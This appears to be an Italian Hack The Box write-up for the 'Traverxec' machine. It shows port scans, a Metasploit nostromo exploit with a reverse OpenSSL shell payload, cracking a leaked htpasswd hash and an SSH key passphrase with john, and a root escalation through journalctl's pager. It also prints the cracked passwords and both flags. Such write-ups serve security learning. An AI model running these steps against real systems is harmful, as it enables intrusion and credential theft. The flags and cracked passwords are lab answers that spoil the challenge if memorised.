@@ -1,0 +1,163 @@
+1) come sempre si inizia con le scansioni solite:
+	masscan -p1-65535 10.10.10.165 --rate 1000 --open --banners -e tun0
+
+Discovered open port 80/tcp on 10.10.10.165                                    
+Discovered open port 22/tcp on 10.10.10.165 
+
+	nmap -p22,80 -Pn -sC -sV -oA nmap/traverxec 10.10.10.165
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|_  256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
+80/tcp open  http    nostromo 1.9.6
+|_http-server-header: nostromo 1.9.6
+|_http-title: TRAVERXEC
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+2)Sulla porta 80 c'è un server web (https://en.wikipedia.org/wiki/Nhttpd)
+oltre la home page non funzionano link ad altre pagine
+quindi provo a fare scansione con dirb ma non c'è niente di interessante
+
+
+3) usando metasploit c'è un exploit che va bene per la versione attuale del server (si trova con search nostromo semplicemente).
+Basta impostare i parametri correttamente e funziona, l'unico parametro
+che va settato "diversamente" dal solito è LHOST, al posto di specificare 0.0.0.0
+si deve mettere l'interfaccia tun0 su cui funziona la vpn verso htb.
+
+(conviene settare il payload set PAYLOAD cmd/unix/reverse_openssl per avere una shell migliore)
+
+4)a questo punto si ha una shell (che spesso funziona male)
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+pwd
+/usr/bin
+
+facendo cd non riesco a cambiare directory ma posso fare ls delle cartelle superiori (con -lag vedo i permessi e sono tutti di root)
+
+posso fare ls var e vedo che c'è dir nostromo, in nostromo ci possono essere delle info utili:
+
+cat /var/nostromo/conf/nhttpd.conf
+
+# MAIN [MANDATORY]
+
+servername		traverxec.htb
+serverlisten		*
+serveradmin		david@traverxec.htb
+serverroot		/var/nostromo
+servermimes		conf/mimes
+docroot			/var/nostromo/htdocs
+docindex		index.html
+
+# LOGS [OPTIONAL]
+
+logpid			logs/nhttpd.pid
+
+# SETUID [RECOMMENDED]
+
+user			www-data
+
+# BASIC AUTHENTICATION [OPTIONAL]
+
+htaccess		.htaccess
+htpasswd		/var/nostromo/conf/.htpasswd
+
+# ALIASES [OPTIONAL]
+
+/icons			/var/nostromo/icons
+
+# HOMEDIRS [OPTIONAL]
+
+homedirs		/home
+homedirs_public		public_www
+
+
+user è david, il contenuto del file /var/nostromo/conf/.htpasswd è:
+
+	david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+
+sembra criptata, posso usare johnny per provare a decriptarla, per prima cosa 
+metto tutta la string ain un file (che chiamo pass), poi:
+	
+	john --wordlist=/root/Desktop/lists/rockyou.txt pass
+
+ottengo,come password per David:
+	Nowonly4me
+
+
+5) le credenziali non funzionano con ssh, guardando il file di cosnifgurazione di nostromo noto una cosa strana: HOMEDIRS, guardando la documentazione (https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd) ci accedo usando http://10.10.10.165/~david/ ma non trovo nulla.
+Dal config file però c'è una dir esclusa da questa protezione, ovvero public_www.
+Infatti riesco ad accedere a /home/david/public_www senza problemi:
+
+drwxr-xr-x 3 david 4096 Oct 25 15:45 .
+drwx--x--x 6 david 4096 Nov 29 14:06 ..
+-rw-r--r-- 1 david  402 Oct 25 15:45 index.html
+drwxr-xr-x 2 david 4096 Oct 25 17:02 protected-file-area
+
+
+in protected-file-area c'è backup-ssh-identity-files.tgz
+
+non ho i permessi per estrarlo ne per trasferirlo, ma posso vedere cosa c'è all'interno con:
+	
+	tar -tvf backup-ssh-identity-files.tgz
+
+ottengo:
+
+drwx------ david/david       0 2019-10-25 17:02 home/david/.ssh/
+-rw-r--r-- david/david     397 2019-10-25 17:02 home/david/.ssh/authorized_keys
+-rw------- david/david    1766 2019-10-25 17:02 home/david/.ssh/id_rsa
+-rw-r--r-- david/david     397 2019-10-25 17:02 home/david/.ssh/id_rsa.pub
+
+
+l'unica dir a cui ho accesso in scrittura con www-data è /tmp quindi:
+
+mkdir /tmp/ex_files
+tar -C /tmp/ex_files -xvf backup-ssh-identity-files.tgz
+
+in questo modo sono riuscito ad estrarre tutti i file
+li copio tutti sulla macchina locale
+ora posso usare le chiavi per collegarmi con ssh, mi richioede la passphrase
+
+per ottenerla (non è quella trovata prima non so perchè) quindi uso di nuov
+john per trovarla, per prima cosa uso ssh2john:
+
+	python ssh2john.py ./ssh_found/id_rsa > ssh_key_john
+
+e poi uso john:
+
+	john --wordlist=/root/Desktop/lists/rockyou.txt ssh_key_john
+
+ottengo la chiave:
+	
+	hunter
+
+quindi posso usarla come passphrase per ssh
+
+
+6) ora ho la shell come david usando:
+
+	ssh -i ./ssh_found/id_rsa david@10.10.10.165
+
+e infatti si ottiene subito il flag di user:
+
+	7db0b48469606a42cec20750d9782f3d
+
+7) andando in ./bin trovo lo script server-stats.sh
+questo script esegue journalctl come root quindi devo sfruttarlo per ottenere la shell di root
+per farlo basta eliminare la pipe al comando cat che sta alla fine del comando (in quanto questo interrrompe
+il comando). In questo modo il comando visulizza alcune info poi rimane in esecuzione, a questo punto basta
+scrivere !/bin/sh e premere invio per ottenere la shell come root e di conseguenza il flag:
+
+	9aa36a6d76f785dfd320a478f6e0d906
+
+
+
+
+
+
+
+
+
+
